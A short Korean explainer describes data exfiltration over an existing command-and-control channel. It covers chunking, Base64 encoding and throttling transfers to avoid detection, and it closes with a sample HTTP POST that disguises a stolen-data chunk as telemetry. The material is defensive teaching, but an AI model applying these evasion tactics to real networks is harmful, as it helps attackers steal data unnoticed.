Exfiltration Over C2

비밀 통신 채널로 기밀 문서 빼돌리기 — C2를 통한 데이터 유출

#1. C2 채널을 통한 유출이란?

📁 ➜ 🔐 ➜ 📡 ➜ 🕵️

"비밀 통신 채널로 기밀 문서 빼돌리기"

해커가 이미 구축해 놓은 C2 통신 채널(HTTP/HTTPS 등)을 이용해 기밀 데이터를 외부로 유출합니다. 별도의 채널을 만들지 않으므로 추가적인 네트워크 연결이 생기지 않아 탐지가 더 어렵습니다. 마치 이미 열려 있는 비밀 통로로 서류를 조금씩 빼돌리는 것과 같습니다.

왜 C2 채널을 재사용하나?

새로운 네트워크 연결을 만들면 이상 탐지(Anomaly Detection)에 걸릴 확률이 높습니다. 기존 C2 채널을 그대로 사용하면 이미 허용된 통신 경로이므로 추가 경보가 발생하지 않습니다.

#2. 청크 전송, 인코딩, 전송량 조절

📦

청크 전송

대용량 파일을 작은 조각(Chunk)으로 나눠 C2 Beacon마다 조금씩 전송

🔤

Base64 인코딩

바이너리 데이터를 텍스트로 변환하여 HTTP 요청 본문에 삽입

⏱️

전송량 조절

업무 시간에만, 소량씩 전송하여 트래픽 급증 경보 회피

# 청크 전송 시뮬레이션
POST /api/telemetry HTTP/1.1
Content-Type: application/json
{"session":"a3f2c","data":"UEsDBBQAAAA..."}
# 정상 텔레메트리 데이터처럼 보이지만 실제로는 유출 데이터 청크
